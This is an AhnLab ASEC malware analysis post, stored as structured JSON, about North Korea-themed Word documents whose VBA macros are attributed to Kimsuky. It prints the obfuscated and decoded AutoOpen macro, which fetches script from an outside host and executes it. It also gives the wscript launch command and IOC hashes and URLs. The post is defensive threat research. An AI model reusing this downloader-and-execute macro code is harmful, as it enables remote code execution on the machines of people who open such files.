{
    "id": "<report_0xb61601fb>",
    "url": "https://asec.ahnlab.com/en/33894",
    "title": "Word Files Related to Diplomacy and National Defense Being Distributed",
    "meta": [],
    "chapters": [
        {
            "id": "<chapter_0xe7668d8c>",
            "title": "Word Files Related to Diplomacy and National Defense Being Distributed",
            "title_level": 1,
            "sentences": [
                {
                    "id": "<sentence_0x286478b7>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "The ASEC analysis team has discovered the continuous distribution of malicious Word files with North Korea-related file names.",
                    "html": "<p>The ASEC analysis team has discovered the continuous distribution of malicious Word files with North Korea-related file names.</p>"
                },
                {
                    "id": "<sentence_0xb1c2b3fa>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<img_0xaec65efa>": "https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/04/image-17.png?resize=826%2C1024&ssl=1"
                    },
                    "text": "Figure 1. 220426-North Koreas Diplomatic Policy and Our Responses (Professor Jeong).doc",
                    "html": "<figure class=\"aligncenter\"><img alt=\"\" class=\"wp-image-33853 jetpack-lazy-image jetpack-lazy-image--handled\" height=\"1111\" src=\"https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/04/image-17.png?resize=826%2C1024&amp;ssl=1\" width=\"896\"/><img alt=\"\" class=\"wp-image-33853\" height=\"1111\" src=\"https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/04/image-17.png?resize=826%2C1024&amp;ssl=1\" width=\"896\"/><figcaption>Figure 1. 220426-North Korea\u2019s Diplomatic Policy and Our Responses (Professor Jeong).doc</figcaption></figure>"
                },
                {
                    "id": "<sentence_0x6a303d03>",
                    "is_empty": true,
                    "have_tags": false,
                    "tags": {},
                    "text": "",
                    "html": "<p></p>"
                },
                {
                    "id": "<sentence_0xea732b1>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0x51045912>": "https://asec.ahnlab.com/en/28320/"
                    },
                    "text": "The Word files contain malicious VBA macro codes and are the same file type introduced in <Discovery of Continuous Distribution of North Korea-related Malicious Word Files>. The names of the distributed files that were recently discovered are as follows:",
                    "html": "<p>The Word files contain malicious VBA macro codes and are the same file type introduced in &lt;<a href=\"https://asec.ahnlab.com/en/28320/\">Discovery of Continuous Distribution of North Korea-related Malicious Word Files</a>&gt;. The names of the distributed files that were recently discovered are as follows:</p>"
                },
                {
                    "id": "<sentence_0x88b57933>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "220426-North Koreas Diplomatic Policy and Our Responses(Professor Jeong).doc (April 26th)<crlf>North Koreas Diplomatic Policy and Our Responses.doc (April 26th)<crlf>Chinas Diplomatic Policy and Our Responses.doc (April 22nd)<crlf>Press Release-INTERNATIONAL FORUM ON ONE KOREA 2022 -20220422.docm (April 23rd)<crlf>[Analysis] North Koreas Position on Use of Nuclear Weapons and Implications of Changes in Military Elites Based on April 25th Military Parade (April 26th)",
                    "html": "<ul><li>220426-North Korea\u2019s Diplomatic Policy and Our Responses(Professor Jeong).doc (April 26th)</li><li>North Korea\u2019s Diplomatic Policy and Our Responses.doc (April 26th)</li><li>China\u2019s Diplomatic Policy and Our Responses.doc (April 22nd)</li><li>Press Release-INTERNATIONAL FORUM ON ONE KOREA 2022 -20220422.docm (April 23rd)</li><li>[Analysis] North Korea\u2019s Position on Use of Nuclear Weapons and Implications of Changes in Military Elites Based on April 25th Military Parade (April 26th)</li></ul>"
                },
                {
                    "id": "<sentence_0x4bb48d8f>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "The discovered macro codes include a code that accesses certain URL and runs the downloaded data. The code discovered in the file North Koreas Diplomatic Policy and Our Responses.doc contains the following obfuscated string.",
                    "html": "<p>The discovered macro codes include a code that accesses certain URL and runs the downloaded data. The code discovered in the file \u2018North Korea\u2019s Diplomatic Policy and Our Responses.doc\u2019 contains the following obfuscated string.</p>"
                },
                {
                    "id": "<sentence_0x878a9ac6>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<code_0x283f40da>": "Function Unpck(idx)\n sa = Array(\"pi^c$\", \"wi^n$m~g^mts^:w^in@3^2_$pro~ces`s\", \"1q^a$z~2^wsx^\", \"On^ $E~r^ror^ R^es@u^me$ Ne~xt:`Set@ m@x $= ^Cr^ea`teO`b`je~ct^(`\"\"~Mi^cro^so~ft$.X`MLH$TT`P\"\"~):`mx^.op$en@ \"\"`GE@T`\"\",` ^\"\"~h^tt`p:/$/g0`0gl`edr^iv^e`.^myw@eb^com`mu~nit$y@.o~rg`/f^il~e~/up^lo`ad^/li`st$.p`h^p?$qu`ery$=^1\"\"~, F$al@se~:mx$.S`end@:$Ex$e@cu`te(`mx.^re$spo`ns~eT`ex^t)\", \"\\v^e$r~s^ion^.i^ni@\", \"ws^c$r~i^pt.^ex^e @/^/e$:vb~scr`ipt@ /@/b$ \")\n Key = \"@ $ ~ ` ^\"\n s = sa(idx)\n arrkey = Split(Key)\n For Each k In arrkey\n s = Replace(s, k, \"\")\n Next\n Unpck = s\nEnd Function"
                    },
                    "text": "",
                    "html": "<code class=\"language-ts\">Function Unpck(idx)\n sa = Array(\"pi^c$\", \"wi^n$m~g^mts^:w^in@3^2_$pro~ces`s\", \"1q^a$z~2^wsx^\", \"On^ $E~r^ror^ R^es@u^me$ Ne~xt:`Set@ m@x $= ^Cr^ea`teO`b`je~ct^(`\"\"~Mi^cro^so~ft$.X`MLH$TT`P\"\"~):`mx^.op$en@ \"\"`GE@T`\"\",` ^\"\"~h^tt`p:/$/g0`0gl`edr^iv^e`.^myw@eb^com`mu~nit$y@.o~rg`/f^il~e~/up^lo`ad^/li`st$.p`h^p?$qu`ery$=^1\"\"~, F$al@se~:mx$.S`end@:$Ex$e@cu`te(`mx.^re$spo`ns~eT`ex^t)\", \"\\v^e$r~s^ion^.i^ni@\", \"ws^c$r~i^pt.^ex^e @/^/e$:vb~scr`ipt@ /@/b$ \")\n Key = \"@ $ ~ ` ^\"\n s = sa(idx)\n arrkey = Split(Key)\n For Each k In arrkey\n s = Replace(s, k, \"\")\n Next\n Unpck = s\nEnd Function</code>"
                },
                {
                    "id": "<sentence_0x204db233>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "The string is used by the AutoOpen() function that is automatically run when the Word file is opened. The decoded string is shown below.",
                    "html": "<p>The string is used by the AutoOpen() function that is automatically run when the Word file is opened. The decoded string is shown below.</p>"
                },
                {
                    "id": "<sentence_0x5251e1dc>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<code_0x8c7aa709>": "Sub AutoOpen()\n On Error Resume Next\n sn = Denor(0) 'pic\n Set wm = GetObject(Denor(1)) 'winmgmts:win32_process\n pw = Denor(2) '1qaz2wsx\n Weed sn, pw\n Present\n Set wnd = ActiveDocument\n wnd.Save\n cnt = Denor(3) 'On Error Resume Next:Set mx = CreateObject(\"Microsoft.XMLHTTP\"):mx.open \"GET\", \"hxxp://g00gledrive.mywebcommunity[.]org/file/upload/list.php?query=1\", False:mx.Send:Execute(mx.responseText)\n pth = Templates(1).Path & Denor(4) '\\version.ini\n ResContent pth, cnt\n wm.Create Denor(5) & pth 'wscript.exe //e:vbscript //b \nEnd Sub"
                    },
                    "text": "",
                    "html": "<code class=\"language-ts\">Sub AutoOpen()\n On Error Resume Next\n sn = Denor(0) 'pic\n Set wm = GetObject(Denor(1)) 'winmgmts:win32_process\n pw = Denor(2) '1qaz2wsx\n Weed sn, pw\n Present\n Set wnd = ActiveDocument\n wnd.Save\n cnt = Denor(3) 'On Error Resume Next:Set mx = CreateObject(\"Microsoft.XMLHTTP\"):mx.open \"GET\", \"hxxp://g00gledrive.mywebcommunity[.]org/file/upload/list.php?query=1\", False:mx.Send:Execute(mx.responseText)\n pth = Templates(1).Path &amp; Denor(4) '\\version.ini\n ResContent pth, cnt\n wm.Create Denor(5) &amp; pth 'wscript.exe //e:vbscript //b \nEnd Sub</code>"
                },
                {
                    "id": "<sentence_0xd0b2a7bd>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0x51045912>": "https://asec.ahnlab.com/en/28320/"
                    },
                    "text": "The macro also contains a code related to removing document protection that was mentioned in the post <Discovery of Continuous Distribution of North Korea-related Malicious Word Files>. The password is 1qaz2wsx, meaning that the macro is likely created by the same attacker.",
                    "html": "<p>The macro also contains a code related to removing document protection that was mentioned in the post &lt;<a href=\"https://asec.ahnlab.com/en/28320/\">Discovery of Continuous Distribution of North Korea-related Malicious Word Files</a>&gt;. The password is 1qaz2wsx, meaning that the macro is likely created by the same attacker.</p>"
                },
                {
                    "id": "<sentence_0xed6dd62a>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "The macro then creates the version.ini file in the %AppData%\\Microsoft\\Templates\\ folder. Inside the file is a command that runs data downloaded from a particular URL. One characteristic of the macro is that it includes list.php?query=1 in the URL it accesses.",
                    "html": "<p>The macro then creates the version.ini file in the %AppData%\\Microsoft\\Templates\\ folder. Inside the file is a command that runs data downloaded from a particular URL. One characteristic of the macro is that it includes \u2018list.php?query=1\u2019 in the URL it accesses.</p>"
                },
                {
                    "id": "<sentence_0xb5e959c3>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<code_0x19dcf26b>": "On Error Resume Next:\nSet mx = CreateObject(\"Microsoft.XMLHTTP\"):\nmx.open \"GET\", \"hxxp://g00gledrive.mywebcommunity[.]org/file/upload/list.php?query=1\", False:\nmx.Send:\nExecute(mx.responseText)"
                    },
                    "text": "",
                    "html": "<code class=\"language-ts\">On Error Resume Next:\nSet mx = CreateObject(\"Microsoft.XMLHTTP\"):\nmx.open \"GET\", \"hxxp://g00gledrive.mywebcommunity[.]org/file/upload/list.php?query=1\", False:\nmx.Send:\nExecute(mx.responseText)</code>"
                },
                {
                    "id": "<sentence_0xf6648c44>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "The created ini file is run by the following command.",
                    "html": "<p>The created ini file is run by the following command.</p>"
                },
                {
                    "id": "<sentence_0xbd2a8437>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "wscript.exe //e:vbscript //b %AppData%\\Microsoft\\Templates\\version.ini",
                    "html": "<ul><li>wscript.exe //e:vbscript //b %AppData%\\Microsoft\\Templates\\version.ini</li></ul>"
                },
                {
                    "id": "<sentence_0x1210de82>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0x2361027f>": "https://asec.ahnlab.com/en/32822/"
                    },
                    "text": "As the URL is no longer valid, the team could not find what the macro does after. Yet as the command used is the same as the one discovered in the post <Word Document Attack Targeting Companies Specialized in Carbon Emissions>, it appears that the macro performed behaviors such as leaking user PC information.",
                    "html": "<p>As the URL is no longer valid, the team could not find what the macro does after. Yet as the command used is the same as the one discovered in the post &lt;<a href=\"https://asec.ahnlab.com/en/32822/\">Word Document Attack Targeting Companies Specialized in Carbon Emissions</a>&gt;, it appears that the macro performed behaviors such as leaking user PC information.</p>"
                },
                {
                    "id": "<sentence_0x98458027>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "As the attacker suspected of creating the malware is continuously distributing malicious Word files with North Korea-related content, users in the relevant field need to take caution. Users should refrain from opening attachments of emails and running macros of unknown sources.",
                    "html": "<p>As the attacker suspected of creating the malware is continuously distributing malicious Word files with North Korea-related content, users in the relevant field need to take caution. Users should refrain from opening attachments of emails and running macros of unknown sources.</p>"
                },
                {
                    "id": "<sentence_0x58901b80>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "AhnLabs anti-malware product, V3, detects and blocks the malware using the alias below.",
                    "html": "<p>AhnLab\u2019s anti-malware product, V3, detects and blocks the malware using the alias below.</p>"
                },
                {
                    "id": "<sentence_0xda74a4cb>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "[File Detection]<crlf>Downloader/DOC.Kimsuky",
                    "html": "<p>[File Detection]\nDownloader/DOC.Kimsuky</p>"
                },
                {
                    "id": "<sentence_0x15da68eb>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "[IOC]<crlf>657b538698483f43aada2e5e4bc4a91d (VBA)<crlf>cb2a18028055cdf1582c1c5ac3756203 (VBA)<crlf>0a0f858beeb6914aaf07896b7790a1d4 (VBA)<crlf>hxxp://g00gledrive.mywebcommunity[.]org/file/upload/list.php?query=1<crlf>hxxp://impartment.myartsonline[.]com/file/upload/list.php?query=1",
                    "html": "<p>[IOC]\n657b538698483f43aada2e5e4bc4a91d (VBA)\ncb2a18028055cdf1582c1c5ac3756203 (VBA)\n0a0f858beeb6914aaf07896b7790a1d4 (VBA)\nhxxp://g00gledrive.mywebcommunity[.]org/file/upload/list.php?query=1\nhxxp://impartment.myartsonline[.]com/file/upload/list.php?query=1</p>"
                },
                {
                    "id": "<sentence_0x539bc0b0>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Subscribe to AhnLabs next-generation threat intelligence platform AhnLab TIP to check related IOC and detailed analysis information.",
                    "html": "<p>Subscribe to AhnLab\u2019s next-generation threat intelligence platform \u2018AhnLab TIP\u2019 to check related IOC and detailed analysis information.</p>"
                },
                {
                    "id": "<sentence_0x678ffc7f>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0xd9eee0bd>": "https://asec.ahnlab.com/en/category/malware-information/"
                    },
                    "text": "Categories:Malware Information",
                    "html": "<p class=\"tax-categories taxonomy\">\nCategories:<a href=\"https://asec.ahnlab.com/en/category/malware-information/\" rel=\"category tag\">Malware Information</a> </p>"
                },
                {
                    "id": "<sentence_0x8589431e>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0xef062d86>": "https://asec.ahnlab.com/en/tag/kimsuky-en/",
                        "<a_0xd7de5138>": "https://asec.ahnlab.com/tag/vba-macro/",
                        "<a_0xb14b1188>": "https://asec.ahnlab.com/tag/word-document/"
                    },
                    "text": "Tagged as:Kimsuky, VBA Macro, Word Document",
                    "html": "<p class=\"tax-tags taxonomy\">Tagged as:<a href=\"https://asec.ahnlab.com/en/tag/kimsuky-en/\" rel=\"tag\">Kimsuky</a>, <a href=\"https://asec.ahnlab.com/tag/vba-macro/\" rel=\"tag\">VBA Macro</a>, <a href=\"https://asec.ahnlab.com/tag/word-document/\" rel=\"tag\">Word Document</a></p>"
                }
            ]
        },
        {
            "id": "<chapter_0x46d6ae3>",
            "title": "Word Files Related to Diplomacy and National Defense Being Distributed",
            "title_level": 1,
            "sentences": [
                {
                    "id": "<sentence_0xe5454005>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Posted on",
                    "html": "\nPosted on "
                },
                {
                    "id": "<sentence_0x7492af6f>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0x29dc75b9>": "https://asec.ahnlab.com/en/33894/"
                    },
                    "text": "May 2, 2022",
                    "html": "<a href=\"https://asec.ahnlab.com/en/33894/\" rel=\"bookmark\" title=\"12:44 pm\">May 2, 2022</a>"
                }
            ]
        }
    ]
}